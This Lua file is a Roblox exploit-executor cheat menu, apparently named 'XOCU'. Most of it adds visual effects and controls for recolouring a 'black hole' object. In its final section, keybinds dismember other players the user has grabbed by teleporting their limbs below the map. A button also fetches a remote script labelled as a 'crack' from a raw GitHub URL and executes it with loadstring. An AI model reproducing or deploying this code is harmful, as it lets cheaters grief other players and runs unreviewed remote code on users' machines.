    -- в”Ђв”Ђ 7. Star Burst в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    FX_defs["Star Burst"] = function()
        local char=Player.Character
        local hrp=char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local starData={}
        local count=8
        for i=1,count do
            local s=Instance.new("Part")
            s.Name="XOCUFXPart"; s.Size=Vector3.new(.4,.4,.4)
            s.Material=Enum.Material.Neon; s.Shape=Enum.PartType.Ball
            s.CanCollide=false; s.CanTouch=false; s.CanQuery=false
            s.Massless=true; s.Anchored=true; s.Parent=char
            table.insert(Visuals.FX.Parts,s)
            table.insert(starData,{part=s, phase=(i-1)*(math.pi*2/count), radius=3+math.random()*2, height=math.sin((i-1)*1.2)*2})
        end
        local t=0
        local conn=R.Heartbeat:Connect(function(dt)
            t=t+dt*3
            local h2=Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if not h2 then return end
            for _,d in ipairs(starData) do
                local ang=t+d.phase
                local x=math.cos(ang)*d.radius
                local z=math.sin(ang)*d.radius
                local y=math.sin(t*1.5+d.phase)*d.height
                d.part.Color=Color3.fromHSV(((t*.05+d.phase)%(math.pi*2))/(math.pi*2),1,1)
                d.part.CFrame=h2.CFrame*CFrame.new(x,y,z)
                local scale=.3+math.sin(t*2+d.phase)*.15
                d.part.Size=Vector3.new(scale,scale,scale)
            end
        end)
        table.insert(Visuals.FX.Connections,conn)
    end

    -- в”Ђв”Ђ 8. Ice Shards в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    FX_defs["Ice Shards"] = function()
        local char=Player.Character
        local hrp=char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local shards={}
        for i=1,6 do
            local s=Instance.new("Part")
            s.Name="XOCUFXPart"; s.Size=Vector3.new(.3,1.4+math.random()*.8,.3)
            s.Material=Enum.Material.Ice; s.Color=Color3.fromRGB(180,230,255)
            s.Transparency=0.25; s.CanCollide=false; s.CanTouch=false
            s.CanQuery=false; s.Massless=true; s.Anchored=true; s.Parent=char
            table.insert(Visuals.FX.Parts,s)
            table.insert(shards,{part=s, phase=(i-1)*(math.pi*2/6), r=2.5+math.random()})
        end
        local t=0
        local conn=R.Heartbeat:Connect(function(dt)
            t=t+dt*.8
            local h2=Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if not h2 then return end
            for _,d in ipairs(shards) do
                local ang=t+d.phase
                local x=math.cos(ang)*d.r; local z=math.sin(ang)*d.r
                d.part.CFrame=h2.CFrame*CFrame.new(x,-1,z)*CFrame.Angles(0,ang,math.pi*.18)
            end
        end)
        table.insert(Visuals.FX.Connections,conn)
    end

    -- в”Ђв”Ђ 9. Shadow Clones в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    FX_defs["Shadow Clones"] = function()
        local char=Player.Character
        if not char then return end
        local clones={}
        local offsets={
            Vector3.new(-3,0,0), Vector3.new(3,0,0),
            Vector3.new(0,0,-3), Vector3.new(0,0,3),
        }
        for i,off in ipairs(offsets) do
            local clone=char:Clone()
            clone.Name="XOCUShadowClone"
            -- strip scripts/humanoid from clone so it's just visual
            for _,v in ipairs(clone:GetDescendants()) do
                if v:IsA("Script") or v:IsA("LocalScript") or v:IsA("Humanoid") then v:Destroy() end
            end
            for _,p in ipairs(clone:GetDescendants()) do
                if p:IsA("BasePart") then
                    p.Transparency=0.65; p.Color=Color3.fromRGB(30,0,60)
                    p.Material=Enum.Material.Neon; p.Anchored=true
                    p.CanCollide=false; p.CanTouch=false; p.CanQuery=false
                end
            end
            clone.Parent=workspace
            table.insert(Visuals.FX.Parts,clone)
            table.insert(clones,{model=clone, off=off})
        end
        local conn=R.Heartbeat:Connect(function()
            local h2=Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if not h2 then return end
            for _,d in ipairs(clones) do
                local hrpClone=d.model:FindFirstChild("HumanoidRootPart")
                if hrpClone then hrpClone.CFrame=h2.CFrame+d.off end
                -- sync all parts
                for _,origP in ipairs(Player.Character:GetChildren()) do
                    if origP:IsA("BasePart") then
                        local cp=d.model:FindFirstChild(origP.Name)
                        if cp then cp.CFrame=origP.CFrame+(d.off) end
                    end
                end
            end
        end)
        table.insert(Visuals.FX.Connections,conn)
    end

    -- в”Ђв”Ђ 10. Meteor Rain в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    FX_defs["Meteor Rain"] = function()
        local alive=true
        local sentinel={Destroy=function() alive=false end}
        table.insert(Visuals.FX.Parts,sentinel)
        task.spawn(function()
            while alive and Visuals.FX.ActiveEnabled do
                local hrp=Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local ox=(math.random()-.5)*20
                    local oz=(math.random()-.5)*20
                    local m=Instance.new("Part")
                    m.Name="XOCUMeteor"; m.Size=Vector3.new(1,1,1)
                    m.Shape=Enum.PartType.Ball
                    m.Material=Enum.Material.Neon
                    m.Color=Color3.fromRGB(255,math.random(50,150),0)
                    m.CanCollide=false; m.CanTouch=false; m.CanQuery=false
                    m.Anchored=false
                    m.CFrame=CFrame.new(hrp.Position+Vector3.new(ox,25,oz))
                    m.AssemblyLinearVelocity=Vector3.new(0,-80,0)
                    m.Parent=workspace
                    game:GetService("Debris"):AddItem(m,2)
                end
                task.wait(.12)
            end
        end)
    end

    -- =====================================================================
    -- Dropdown + Toggle to select & enable any effect
    -- =====================================================================
    local FX_names = {}
    for k in pairs(FX_defs) do table.insert(FX_names, k) end
    table.sort(FX_names)
    table.insert(FX_names, 1, "None")

    Visuals.FX.ActiveEffect = "None"

    VisEffects:CreateDropdown({
        Name    = "Select Effect",
        Flag    = "VisualFXSelect",
        Items   = FX_names,
        Default = "None",
        Callback = function(v)
            Visuals.FX.ActiveEffect = v
            -- If already enabled, hot-swap to new effect
            if Visuals.FX.ActiveEnabled then
                FX_cleanup()
                if v ~= "None" and FX_defs[v] then FX_defs[v]() end
            end
        end,
    })

    VisEffects:CreateToggle({
        Name    = "Enable Effect",
        Flag    = "VisualFXEnable",
        Default = false,
        Callback = function(v)
            Visuals.FX.ActiveEnabled = v
            if v then
                local name = Visuals.FX.ActiveEffect
                if name and name ~= "None" and FX_defs[name] then
                    FX_cleanup()
                    FX_defs[name]()
                    -- Re-apply on respawn
                    local respawnConn
                    respawnConn = Player.CharacterAdded:Connect(function()
                        task.wait(0.5)
                        if Visuals.FX.ActiveEnabled and Visuals.FX.ActiveEffect == name then
                            FX_cleanup()
                            FX_defs[name]()
                        else
                            respawnConn:Disconnect()
                        end
                    end)
                    table.insert(Visuals.FX.Connections, respawnConn)
                end
            else
                FX_cleanup()
            end
        end,
    })
end
-- Create a new block in your Visuals Tab
local BlackHoleSettings = Tabs.Visuals:CreateBlock({Name = "Black Hole Customizer", Side = "Right"})
-- =========================================================================
-- BLACK HOLE SETTINGS & CONFIGURATION
-- =========================================================================

local BHK_Settings = {
    ColorMode      = "Default",
    NeonGlow       = false,
    Silent         = false,
    ReverbEnabled  = true,
    BeamWidth0     = 1,
    BeamWidth1     = 1,
    BillboardSize  = 10,
    HideBillboard  = false,
    RainbowActive  = false,
    RainbowConn    = nil,
    WatcherConn    = nil,
    BeamTransparency = 0,
}

local customBH = false
local bhConnection = nil

local BHK_ColorTable = {
    ["Default"]   = { hole = Color3.fromRGB(0,   0,   0),   beam = ColorSequence.new(Color3.fromRGB(170, 0, 255)), gui = Color3.fromRGB(150, 0, 255) },
    ["White Hole"]= { hole = Color3.fromRGB(255, 255, 255), beam = ColorSequence.new(Color3.fromRGB(255,255,255)), gui = Color3.fromRGB(255,255,255) },
    ["Red Hole"]  = { hole = Color3.fromRGB(180,  0,   0),  beam = ColorSequence.new(Color3.fromRGB(255, 50, 50)), gui = Color3.fromRGB(200, 30, 30) },
    ["Blue Hole"] = { hole = Color3.fromRGB(0,   50, 180),  beam = ColorSequence.new(Color3.fromRGB(50, 120,255)), gui = Color3.fromRGB(30,  80,220) },
    ["Green Hole"]= { hole = Color3.fromRGB(0,  120,  30),  beam = ColorSequence.new(Color3.fromRGB(50, 255,100)), gui = Color3.fromRGB(20, 180, 60) },
    ["Gold Hole"] = { hole = Color3.fromRGB(180,140,   0),  beam = ColorSequence.new(Color3.fromRGB(255,220, 50)), gui = Color3.fromRGB(220,180, 20) },
    ["Cyan Hole"] = { hole = Color3.fromRGB(0,  180, 200),  beam = ColorSequence.new(Color3.fromRGB(50, 230,255)), gui = Color3.fromRGB(0,  200,230) },
    ["Pink Hole"] = { hole = Color3.fromRGB(220, 50, 180),  beam = ColorSequence.new(Color3.fromRGB(255,100,220)), gui = Color3.fromRGB(230, 60,200) },
}

-- =========================================================================
-- HELPER FUNCTIONS
-- =========================================================================

-- Legacy White Hole Visual Applier
local function applyWhiteHoleVisuals(model)
    if not model or not model:FindFirstChild("Hole") then return end
    local hole = model.Hole
    
    if _G.WhiteHoleEnabled then
        hole.Color = Color3.fromRGB(255, 255, 255)
        hole.Material = Enum.Material.Neon 
        
        local beam = hole:FindFirstChild("Attachment") and hole.Attachment:FindFirstChild("Beam")
        if beam then
            beam.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255))
        end
        
        local gui = hole:FindFirstChild("BillboardGui")
        if gui then
            if gui:FindFirstChild("Large") then gui.Large.ImageColor3 = Color3.fromRGB(255, 255, 255) end
            if gui:FindFirstChild("Small") then gui.Small.ImageColor3 = Color3.fromRGB(255, 255, 255) end
        end
    else
        hole.Color = Color3.fromRGB(0, 0, 0)
        hole.Material = Enum.Material.Plastic 
        
        local beam = hole:FindFirstChild("Attachment") and hole.Attachment:FindFirstChild("Beam")
        if beam then
            beam.Color = ColorSequence.new(Color3.fromRGB(170, 0, 255)) 
        end
        
        local gui = hole:FindFirstChild("BillboardGui")
        if gui then
            if gui:FindFirstChild("Large") then gui.Large.ImageColor3 = Color3.fromRGB(150, 0, 255) end
            if gui:FindFirstChild("Small") then gui.Small.ImageColor3 = Color3.fromRGB(150, 0, 255) end
        end
    end
end

-- Realistic Black Hole Applier
local function applyRealisticBH(model)
    if not model then return end

    local success, realisticModel = pcall(function()
        return game:GetObjects("rbxassetid://16797584940")[1]
    end)
    if not success or not realisticModel then return end
    
    local hole = model:FindFirstChild("Hole")
    if not hole then return end

    for _, obj in pairs(realisticModel:GetDescendants()) do
        if obj:IsA("ParticleEmitter") or obj:IsA("Beam") or obj:IsA("Sound") or obj:IsA("Trail") then
            local clone = obj:Clone()
            clone.Parent = hole
        end
        if obj:IsA("BillboardGui") then
            local currentGui = hole:FindFirstChild("BillboardGui")
            if currentGui then
                local newGui = obj:Clone()
                newGui.Parent = hole
                if currentGui:FindFirstChild("Large") and newGui:FindFirstChild("Large") then
                    currentGui.Large.Image = newGui.Large.Image
                end
                if currentGui:FindFirstChild("Small") and newGui:FindFirstChild("Small") then
                    currentGui.Small.Image = newGui.Small.Image
                end
                newGui:Destroy()
            end
        end
    end
    
    realisticModel:Destroy()
end

-- Extra Visuals Main Applier
local function BHK_ApplyToModel(model)
    if not model then return end
    local hole = model:FindFirstChild("Hole")
    if not hole then return end

    -- Material
    hole.Material = BHK_Settings.NeonGlow and Enum.Material.Neon or Enum.Material.Plastic

    -- Color (skip if rainbow is managing it)
    if not BHK_Settings.RainbowActive then
        local ct = BHK_ColorTable[BHK_Settings.ColorMode]
        if ct then
            hole.Color = ct.hole
            local beam = hole:FindFirstChild("Attachment") and hole.Attachment:FindFirstChild("Beam")
            if beam then beam.Color = ct.beam end
            local gui = hole:FindFirstChild("BillboardGui")
            if gui then
                if gui:FindFirstChild("Large")  then gui.Large.ImageColor3  = ct.gui end
                if gui:FindFirstChild("Small")  then gui.Small.ImageColor3  = ct.gui end
            end
        end
    end

    -- Beam width & transparency
    local beam = hole:FindFirstChild("Attachment") and hole.Attachment:FindFirstChild("Beam")
    if beam then
        beam.Width0 = BHK_Settings.BeamWidth0
        beam.Width1 = BHK_Settings.BeamWidth1
        beam.Transparency = NumberSequence.new(BHK_Settings.BeamTransparency / 100)
    end

    -- Billboard size & visibility
    local gui = hole:FindFirstChild("BillboardGui")
    if gui then
        gui.Size = UDim2.new(BHK_Settings.BillboardSize, 0, BHK_Settings.BillboardSize, 0)
        gui.Enabled = not BHK_Settings.HideBillboard
    end

    -- Sounds
    local drone  = hole:FindFirstChild("Drone")
    local scream = hole:FindFirstChild("Scream")
    if drone  then drone.Volume  = BHK_Settings.Silent and 0 or 1 end
    if scream then scream.Volume = BHK_Settings.Silent and 0 or 1 end
    if scream then
        local reverb = scream:FindFirstChildOfClass("ReverbSoundEffect")
        if reverb then reverb.Enabled = BHK_Settings.ReverbEnabled end
    end
end

local function BHK_ApplyCurrent()
    BHK_ApplyToModel(workspace:FindFirstChild("BlackHoleKick"))
end

local function BHK_SetupWatcher()
    if BHK_Settings.WatcherConn then BHK_Settings.WatcherConn:Disconnect() end
    BHK_Settings.WatcherConn = workspace.ChildAdded:Connect(function(child)
        if child.Name == "BlackHoleKick" then
            task.wait(0.1)
            BHK_ApplyToModel(child)
        end
    end)
end

-- Initialize automated watcher
BHK_SetupWatcher()

-- =========================================================================
-- UI ELEMENTS / INTERFACE CONTROLS
-- =========================================================================

-- Legacy White Hole Toggle
BlackHoleSettings:CreateToggle({
    Name = "White Hole Mode",
    Flag = "WhiteHoleKickMode",
    Default = false,
    Callback = function(enabled)
        _G.WhiteHoleEnabled = enabled
        
        local current = workspace:FindFirstChild("BlackHoleKick")
        if current then
            applyWhiteHoleVisuals(current)
        end
        
        if _G.BlackHoleWatcher then _G.BlackHoleWatcher:Disconnect() end
        if enabled then
            _G.BlackHoleWatcher = workspace.ChildAdded:Connect(function(child)
                if child.Name == "BlackHoleKick" then
                    task.wait(0.1)
                    applyWhiteHoleVisuals(child)
                end
            end)
        end
    end
})

-- Realistic Black Hole Toggle
BlackHoleSettings:CreateToggle({
    Name = "Realistic Black Hole",
    Flag = "BHKRealisticMode",
    Default = false,
    Callback = function(Value)
        customBH = Value
        
        if Value then
            local current = workspace:FindFirstChild("BlackHoleKick")
            if current then
                applyRealisticBH(current)
            end
            
            bhConnection = workspace.ChildAdded:Connect(function(child)
                if child.Name == "BlackHoleKick" then
                    task.wait()
                    applyRealisticBH(child)
                end
            end)
        else
            if bhConnection then bhConnection:Disconnect(); bhConnection = nil end
        end
    end
})

-- Color Mode Dropdown
BlackHoleSettings:CreateDropdown({
    Name    = "Hole Color Mode",
    Flag    = "BHKColorMode",
    Items   = {"Default", "White Hole", "Red Hole", "Blue Hole", "Green Hole", "Gold Hole", "Cyan Hole", "Pink Hole"},
    Default = "Default",
    Callback = function(v)
        BHK_Settings.ColorMode = v
        BHK_Settings.RainbowActive = false
        if BHK_Settings.RainbowConn then BHK_Settings.RainbowConn:Disconnect(); BHK_Settings.RainbowConn = nil end
        BHK_ApplyCurrent()
    end
})

-- Neon Glow Toggle
BlackHoleSettings:CreateToggle({
    Name    = "Neon Glow",
    Flag    = "BHKNeonGlow",
    Default = false,
    Callback = function(v)
        BHK_Settings.NeonGlow = v
        BHK_ApplyCurrent()
    end
})

-- Rainbow Mode Toggle
BlackHoleSettings:CreateToggle({
    Name    = "Rainbow Mode",
    Flag    = "BHKRainbow",
    Default = false,
    Callback = function(v)
        BHK_Settings.RainbowActive = v
        if BHK_Settings.RainbowConn then BHK_Settings.RainbowConn:Disconnect(); BHK_Settings.RainbowConn = nil end
        if v then
            local hue = 0
            BHK_Settings.RainbowConn = game:GetService("RunService").Heartbeat:Connect(function(dt)
                hue = (hue + dt * 0.3) % 1
                local c = Color3.fromHSV(hue, 1, 1)
                local model = workspace:FindFirstChild("BlackHoleKick")
                if not model then return end
                local hole = model:FindFirstChild("Hole")
                if not hole then return end
                hole.Color = c
                local beam = hole:FindFirstChild("Attachment") and hole.Attachment:FindFirstChild("Beam")
                if beam then beam.Color = ColorSequence.new(c) end
                local gui = hole:FindFirstChild("BillboardGui")
                if gui then
                    if gui:FindFirstChild("Large") then gui.Large.ImageColor3 = c end
                    if gui:FindFirstChild("Small") then gui.Small.ImageColor3 = c end
                end
            end)
        end
    end
})

-- Beam Width Sliders
BlackHoleSettings:CreateSlider({
    Name    = "Beam Width (Inner)",
    Flag    = "BHKBeamW0",
    Min     = 0,
    Max     = 20,
    Default = 1,
    Callback = function(v)
        BHK_Settings.BeamWidth0 = v
        local model = workspace:FindFirstChild("BlackHoleKick")
        if model then
            local hole = model:FindFirstChild("Hole")
            local beam = hole and hole:FindFirstChild("Attachment") and hole.Attachment:FindFirstChild("Beam")
            if beam then beam.Width0 = v end
        end
    end
})

BlackHoleSettings:CreateSlider({
    Name    = "Beam Width (Outer)",
    Flag    = "BHKBeamW1",
    Min     = 0,
    Max     = 20,
    Default = 1,
    Callback = function(v)
        BHK_Settings.BeamWidth1 = v
        local model = workspace:FindFirstChild("BlackHoleKick")
        if model then
            local hole = model:FindFirstChild("Hole")
            local beam = hole and hole:FindFirstChild("Attachment") and hole.Attachment:FindFirstChild("Beam")
            if beam then beam.Width1 = v end
        end
    end
})

-- Beam Transparency Slider
BlackHoleSettings:CreateSlider({
    Name    = "Beam Transparency",
    Flag    = "BHKBeamTransp",
    Min     = 0,
    Max     = 100,
    Default = 0,
    Callback = function(v)
        BHK_Settings.BeamTransparency = v
        local model = workspace:FindFirstChild("BlackHoleKick")
        if model then
            local hole = model:FindFirstChild("Hole")
            local beam = hole and hole:FindFirstChild("Attachment") and hole.Attachment:FindFirstChild("Beam")
            if beam then
                beam.Transparency = NumberSequence.new(v / 100)
            end
        end
    end
})

-- Billboard Size Slider
BlackHoleSettings:CreateSlider({
    Name    = "Billboard Size",
    Flag    = "BHKBillboardSize",
    Min     = 2,
    Max     = 40,
    Default = 10,
    Callback = function(v)
        BHK_Settings.BillboardSize = v
        local model = workspace:FindFirstChild("BlackHoleKick")
        if model then
            local hole = model:FindFirstChild("Hole")
            local gui  = hole and hole:FindFirstChild("BillboardGui")
            if gui then gui.Size = UDim2.new(v, 0, v, 0) end
        end
    end
})

-- Hide Billboard Toggle
BlackHoleSettings:CreateToggle({
    Name    = "Hide Billboard (Stealth)",
    Flag    = "BHKHideBillboard",
    Default = false,
    Callback = function(v)
        BHK_Settings.HideBillboard = v
        local model = workspace:FindFirstChild("BlackHoleKick")
        if model then
            local hole = model:FindFirstChild("Hole")
            local gui  = hole and hole:FindFirstChild("BillboardGui")
            if gui then gui.Enabled = not v end
        end
    end
})

-- Silent Black Hole Toggle
BlackHoleSettings:CreateToggle({
    Name    = "Silent Black Hole",
    Flag    = "BHKSilent",
    Default = false,
    Callback = function(v)
        BHK_Settings.Silent = v
        local model = workspace:FindFirstChild("BlackHoleKick")
        if model then
            local hole   = model:FindFirstChild("Hole")
            local drone  = hole and hole:FindFirstChild("Drone")
            local scream = hole and hole:FindFirstChild("Scream")
            if drone  then drone.Volume  = v and 0 or 1 end
            if scream then scream.Volume = v and 0 or 1 end
        end
    end
})

BlackHoleSettings:CreateToggle({
    Name    = "Scream Reverb Effect",
    Flag    = "BHKReverb",
    Default = true,
    Callback = function(v)
        BHK_Settings.ReverbEnabled = v
        local model = workspace:FindFirstChild("BlackHoleKick")
        if model then
            local hole   = model:FindFirstChild("Hole")
            local scream = hole and hole:FindFirstChild("Scream")
            if scream then
                local reverb = scream:FindFirstChildOfClass("ReverbSoundEffect")
                if reverb then reverb.Enabled = v end
            end
        end
    end
})
end

    local Key2Group = Tabs.Keybinds:CreateBlock({Name = "Keybind2", Side = "Right"})

do

    local UserInputService = game:GetService("UserInputService")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer

    local tpEnabled = true

    Key2Group:CreateKeybind({
        Name = "Remove Left Leg",
        Flag = "RemoveLeftLeg",
        Default = "None",
        Callback = function()
            if workspace:FindFirstChild('GrabParts') and workspace.GrabParts:FindFirstChild('GrabPart') then
                local target = workspace.GrabParts.GrabPart.WeldConstraint.Part1 and workspace.GrabParts.GrabPart.WeldConstraint.Part1.Parent
                if target and target:FindFirstChild('Left Leg') and target:FindFirstChild('Humanoid') and target.Humanoid:FindFirstChild('Ragdolled') then
                    if target.Humanoid.Ragdolled.Value then
                        local pos = target.Torso.CFrame
                        workspace.FallenPartsDestroyHeight = -100
                        target['Left Leg'].CFrame = CFrame.new(0, -1E3, 0)
                        task.wait(0.1)
                        target.Torso.CFrame = CFrame.new(0, -950, 0)
                        task.wait(0)
                        target.Torso.CFrame = pos
                    end
                end
            end
        end
    })

    Key2Group:CreateKeybind({
        Name = "Remove Right Leg",
        Flag = "RemoveRightLeg",
        Default = "None",
        Callback = function()
            if workspace:FindFirstChild('GrabParts') and workspace.GrabParts:FindFirstChild('GrabPart') then
                local target = workspace.GrabParts.GrabPart.WeldConstraint.Part1 and workspace.GrabParts.GrabPart.WeldConstraint.Part1.Parent
                if target and target:FindFirstChild('Right Leg') and target:FindFirstChild('Humanoid') and target.Humanoid:FindFirstChild('Ragdolled') then
                    if target.Humanoid.Ragdolled.Value then
                        local pos = target.Torso.CFrame
                        workspace.FallenPartsDestroyHeight = -100
                        target['Right Leg'].CFrame = CFrame.new(0, -1E3, 0)
                        task.wait(0.1)
                        target.Torso.CFrame = CFrame.new(0, -950, 0)
                        task.wait(0)
                        target.Torso.CFrame = pos
                    end
                end
            end
        end
    })

    Key2Group:CreateKeybind({
        Name = "Remove Left Arm",
        Flag = "RemoveLeftArm",
        Default = "None",
        Callback = function()
            if workspace:FindFirstChild('GrabParts') and workspace.GrabParts:FindFirstChild('GrabPart') then
                local target = workspace.GrabParts.GrabPart.WeldConstraint.Part1 and workspace.GrabParts.GrabPart.WeldConstraint.Part1.Parent
                if target and target:FindFirstChild('Left Arm') and target:FindFirstChild('Humanoid') and target.Humanoid:FindFirstChild('Ragdolled') then
                    if target.Humanoid.Ragdolled.Value then
                        local pos = target.Torso.CFrame
                        workspace.FallenPartsDestroyHeight = -100
                        target['Left Arm'].CFrame = CFrame.new(0, -1E3, 0)
                        task.wait(0.1)
                        target.Torso.CFrame = CFrame.new(0, -950, 0)
                        task.wait(0)
                        target.Torso.CFrame = pos
                    end
                end
            end
        end
    })

    Key2Group:CreateKeybind({
        Name = "Remove Right Arm",
        Flag = "RemoveRightArm",
        Default = "None",
        Callback = function()
            if workspace:FindFirstChild('GrabParts') and workspace.GrabParts:FindFirstChild('GrabPart') then
                local target = workspace.GrabParts.GrabPart.WeldConstraint.Part1 and workspace.GrabParts.GrabPart.WeldConstraint.Part1.Parent
                if target and target:FindFirstChild('Right Arm') and target:FindFirstChild('Humanoid') and target.Humanoid:FindFirstChild('Ragdolled') then
                    if target.Humanoid.Ragdolled.Value then
                        local pos = target.Torso.CFrame
                        workspace.FallenPartsDestroyHeight = -100
                        target['Right Arm'].CFrame = CFrame.new(0, -1E3, 0)
                        task.wait(0.1)
                        target.Torso.CFrame = CFrame.new(0, -950, 0)
                        task.wait(0)
                        target.Torso.CFrame = pos
                    end
                end
            end
        end
    })

    KeybindsGroup:CreateKeybind({
        Name = "TP to Spawn",
        Flag = "TP_ToSpawn",
        Default = "None",
        Callback = function()
            local char = LocalPlayer.Character
            local hrp = char and char:FindFirstChild('HumanoidRootPart')
            if hrp then
                hrp.CFrame = CFrame.new(0, -5, 0)
            end
        end
    })

    KeybindsGroup:CreateKeybind({
        Name = "Loop TP Toggle",
        Flag = "TP_LoopToggle",
        Default = "None",
        Callback = function()
            if Toggles.LoopTpToggle then
                Toggles.LoopTpToggle:SetValue(not Toggles.LoopTpToggle:GetValue())
            end
        end
    })

    Key2Group:CreateButton({
        Name = "Mobile Keyboard",
        Callback = function()
            if not _G.MobileKeyboardLoaded then
                _G.MobileKeyboardLoaded = true
                loadstring(game:HttpGet('https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt', true))()
            end
        end
    })
end

print("XOCU Loaded Xocu and 9rr so goated")

end
